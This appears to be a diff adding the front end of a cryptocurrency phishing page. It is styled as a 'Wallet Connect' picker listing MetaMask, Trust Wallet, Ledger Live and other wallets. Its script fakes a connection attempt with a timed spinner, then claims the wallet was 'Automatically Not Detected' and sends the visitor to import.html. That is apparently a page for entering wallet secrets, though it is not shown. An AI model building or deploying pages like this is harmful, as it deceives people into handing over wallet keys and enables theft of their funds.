@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wallet Connect</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      background: #07111f;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+
+    .background-glow {
+      position: fixed;
+      width: 500px;
+      height: 500px;
+      border-radius: 50%;
+      background: rgba(59, 130, 246, 0.15);
+      filter: blur(120px);
+      z-index: 0;
+      top: -150px;
+      right: -120px;
+    }
+
+    .wallet-container {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      max-width: 520px;
+      background: rgba(15, 23, 42, 0.92);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(20px);
+      border-radius: 28px;
+      overflow: hidden;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.5);
+    }
+
+    .wallet-header {
+      padding: 35px 28px 20px;
+      text-align: center;
+      background: linear-gradient(to bottom, rgba(255, 255, 255, 0.03), transparent);
+    }
+
+    .wallet-header p {
+      font-size: 15px;
+      line-height: 1.6;
+      color: #94a3b8;
+      max-width: 360px;
+      margin: auto;
+    }
+
+    .search-wrapper {
+      padding: 0 18px 18px;
+    }
+
+    .search-box {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 18px;
+      padding: 14px 18px;
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+      transition: 0.25s ease;
+    }
+
+    .search-box::placeholder {
+      color: #64748b;
+    }
+
+    .search-box:focus {
+      border-color: rgba(59, 130, 246, 0.5);
+      background: rgba(59, 130, 246, 0.06);
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+    }
+
+    .wallet-list {
+      padding: 0 18px 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      max-height: 68vh;
+      overflow-y: auto;
+    }
+
+    .wallet-list::-webkit-scrollbar {
+      width: 5px;
+    }
+
+    .wallet-list::-webkit-scrollbar-thumb {
+      background: #334155;
+      border-radius: 20px;
+    }
+
+    .wallet-card {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 22px;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      transition: 0.25s ease;
+    }
+
+    .wallet-card:hover {
+      transform: translateY(-2px);
+      background: rgba(59, 130, 246, 0.08);
+      border-color: rgba(59, 130, 246, 0.35);
+    }
+
+    .wallet-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .wallet-left img {
+      width: 50px;
+      height: 50px;
+      border-radius: 16px;
+      object-fit: cover;
+      background: #fff;
+      padding: 4px;
+    }
+
+    .wallet-info h3 {
+      font-size: 16px;
+      font-weight: 600;
+      color: #fff;
+      margin-bottom: 4px;
+    }
+
+    .wallet-info p {
+      font-size: 13px;
+      color: #94a3b8;
+    }
+
+    .wallet-right {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #22c55e;
+      box-shadow: 0 0 10px #22c55e;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      z-index: 999;
+      backdrop-filter: blur(8px);
+    }
+
+    .modal {
+      width: 100%;
+      max-width: 380px;
+      background: #0f172a;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 28px;
+      padding: 32px 24px;
+      text-align: center;
+      animation: fadeIn .25s ease;
+    }
+
+    .modal h2 {
+      font-size: 24px;
+      color: #fff;
+      margin-bottom: 10px;
+    }
+
+    .modal p {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #94a3b8;
+    }
+
+    .spinner {
+      width: 58px;
+      height: 58px;
+      border-radius: 50%;
+      border: 4px solid rgba(255, 255, 255, 0.08);
+      border-top: 4px solid #3b82f6;
+      margin: 28px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    .warning-box {
+      background: rgba(239, 68, 68, 0.08);
+      border: 1px solid rgba(239, 68, 68, 0.25);
+      padding: 16px;
+      border-radius: 18px;
+      margin-top: 18px;
+      font-size: 14px;
+      line-height: 1.7;
+      color: #fecaca;
+    }
+
+    .continue-btn {
+      width: 100%;
+      margin-top: 18px;
+      padding: 14px;
+      border: none;
+      border-radius: 16px;
+      background: linear-gradient(135deg, #2563eb, #3b82f6);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.25s;
+    }
+
+    .continue-btn:hover {
+      opacity: 0.92;
+      transform: translateY(-1px);
+    }
+
+    @keyframes spin {
+      from {
+        transform: rotate(0deg)
+      }
+
+      to {
+        transform: rotate(360deg)
+      }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(12px)
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0)
+      }
+    }
+
+    @media(max-width:600px) {
+      .wallet-container {
+        border-radius: 24px;
+      }
+
+      .wallet-header {
+        padding: 28px 20px 18px;
+      }
+
+      .wallet-card {
+        padding: 14px;
+      }
+
+      .wallet-left img {
+        width: 45px;
+        height: 45px;
+      }
+
+      .wallet-info h3 {
+        font-size: 15px;
+      }
+
+      .wallet-info p {
+        font-size: 12px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="background-glow"></div>
+
+  <div class="wallet-container">
+
+    <div class="wallet-header">
+      <p>
+        Choose your preferred wallet provider to continue securely.
+      </p>
+    </div>
+
+    <div class="search-wrapper">
+      <input type="text" class="search-box" id="walletSearch" placeholder="Search wallet..." onkeyup="searchWallets()">
+    </div>
+
+    <div class="wallet-list" id="walletList">
+
+      <div class="wallet-card" onclick="walletConnect('MetaMask')">
+        <div class="wallet-left">
+          <img src="images wallet/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png">
+          <div class="wallet-info">
+            <h3>MetaMask</h3>
+            <p>Ethereum Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('Trust Wallet')">
+        <div class="wallet-left">
+          <img src="images wallet/trust-wallet-66f8777532931d9c09b633344981a6a9.png">
+          <div class="wallet-info">
+            <h3>Trust Wallet</h3>
+            <p>Multi-Chain Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('Coinbase Wallet')">
+        <div class="wallet-left">
+          <img src="images wallet/coinbase.png">
+          <div class="wallet-info">
+            <h3>Coinbase Wallet</h3>
+            <p>Self-Custody Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('Uniswap Wallet')">
+        <div class="wallet-left">
+          <img src="images wallet/Uniswap-Logo.webp">
+          <div class="wallet-info">
+            <h3>Uniswap Wallet</h3>
+            <p>Defi Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('Tonkeeper')">
+        <div class="wallet-left">
+          <img src="images wallet/Tonkeeperwallet.jpg">
+          <div class="wallet-info">
+            <h3>TonKeeper</h3>
+            <p>Secure Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+
+       <div class="wallet-card" onclick="walletConnect('Tonhub')">
+        <div class="wallet-left">
+          <img src="images wallet/TonHubWallet.jpg">
+          <div class="wallet-info">
+            <h3>TonHub Wallet</h3>
+            <p>Ton Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+
+       <div class="wallet-card" onclick="walletConnect('Tokenpocket')">
+        <div class="wallet-left">
+          <img src="images wallet/tokenpocket.webp">
+          <div class="wallet-info">
+            <h3>Tokenpocket</h3>
+            <p>Safe Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+
+
+      <div class="wallet-card" onclick="walletConnect('Phantom')">
+        <div class="wallet-left">
+          <img src="images wallet/phantom.png">
+          <div class="wallet-info">
+            <h3>Phantom</h3>
+            <p>Solana Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('Ledger Live')">
+        <div class="wallet-left">
+          <img src="images wallet/ledger live.png">
+          <div class="wallet-info">
+            <h3>Ledger Live</h3>
+            <p>Hardware Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('Zerion')">
+        <div class="wallet-left">
+          <img src="images wallet/zerion.webp">
+          <div class="wallet-info">
+            <h3>Zerion</h3>
+            <p>Custom Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('SafePal')">
+        <div class="wallet-left">
+          <img src="images wallet/safepal new.webp">
+          <div class="wallet-info">
+            <h3>SafePal</h3>
+            <p>Secure Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('Rabby Wallet')">
+        <div class="wallet-left">
+          <img src="images wallet/Rabby.jpg">
+          <div class="wallet-info">
+            <h3>Rabby Wallet</h3>
+            <p>DeFi Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('Exodus Wallet')">
+        <div class="wallet-left">
+          <img src="images wallet/Exodus.jpg">
+          <div class="wallet-info">
+            <h3>Exodus Wallet</h3>
+            <p>Desktop & Mobile</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('OKX Wallet')">
+        <div class="wallet-left">
+          <img src="images wallet/okx.png">
+          <div class="wallet-info">
+            <h3>OKX Wallet</h3>
+            <p>Trading Wallet</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('Binance Web3')">
+        <div class="wallet-left">
+          <img src="images wallet/binance.png">
+          <div class="wallet-info">
+            <h3>Binance Web3</h3>
+            <p>BNB Smart Chain</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" onclick="walletConnect('Telegram Wallet')">
+        <div class="wallet-left">
+          <img src="images wallet/tgwallet.jpeg">
+          <div class="wallet-info">
+            <h3>Telegram Wallet</h3>
+            <p>TON Ecosystem</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+      <div class="wallet-card" id="otherWalletCard" onclick="walletConnect('Other Wallet')">
+        <div class="wallet-left">
+          <img src="images wallet/otherssss.jpg">
+          <div class="wallet-info">
+            <h3>Other Wallets</h3>
+            <p>Additional Providers</p>
+          </div>
+        </div>
+        <div class="wallet-right"></div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="walletModal">
+    <div class="modal">
+      <h2 id="walletTitle">Connecting...</h2>
+
+      <div class="spinner" id="walletSpinner"></div>
+
+      <div id="walletMessage">
+        <p>Waiting for wallet response...</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function searchWallets() {
+      const input = document.getElementById('walletSearch');
+      const filter = input.value.toLowerCase();
+      const walletCards = document.querySelectorAll('.wallet-card');
+      const otherWalletCard = document.getElementById('otherWalletCard');
+
+      let visibleCount = 0;
+
+      walletCards.forEach(card => {
+        const walletName = card.querySelector('h3').innerText.toLowerCase();
+
+        // Skip Other Wallets during normal filtering
+        if (card.id === 'otherWalletCard') {
+          card.style.display = 'none';
+          return;
+        }
+
+        if (walletName.includes(filter)) {
+          card.style.display = 'flex';
+          visibleCount++;
+        } else {
+          card.style.display = 'none';
+        }
+      });
+
+      // Show Other Wallets only when no match found
+      if (visibleCount === 0) {
+        otherWalletCard.style.display = 'flex';
+      } else {
+        otherWalletCard.style.display = 'none';
+      }
+
+      // Show all wallets again when search box is empty
+      if (filter === '') {
+        walletCards.forEach(card => {
+          card.style.display = 'flex';
+        });
+      }
+    }
+
+    function walletConnect(walletName) {
+      const modal = document.getElementById('walletModal');
+      const title = document.getElementById('walletTitle');
+      const spinner = document.getElementById('walletSpinner');
+      const message = document.getElementById('walletMessage');
+
+      modal.style.display = 'flex';
+
+      spinner.style.display = 'block';
+
+      title.innerText = `Connecting to ${walletName}`;
+
+      message.innerHTML = `
+<p>Waiting for wallet response...</p>
+`;
+
+      setTimeout(() => {
+        spinner.style.display = 'none';
+
+        message.innerHTML = `
+<div class="warning-box">
+<strong>Wallet Automatically Not Detected</strong><br><br>
+Click Continue & Approve connection in your wallet...
+</div>
+
+<button class="continue-btn" id="continueBtn" onclick="continueRedirect()">
+Continue
+</button>
+`;
+
+      }, 2500);
+    }
+
+   function continueRedirect() {
+  const btn = document.getElementById('continueBtn');
+
+  btn.innerText = 'Connecting....';
+  btn.disabled = true;
+  btn.style.opacity = '0.7';
+  btn.style.cursor = 'not-allowed';
+
+  setTimeout(() => {
+    window.location.href = 'import.html';
+  }, 1500);
+}
+  </script>
+
+</body>
+
+</html>
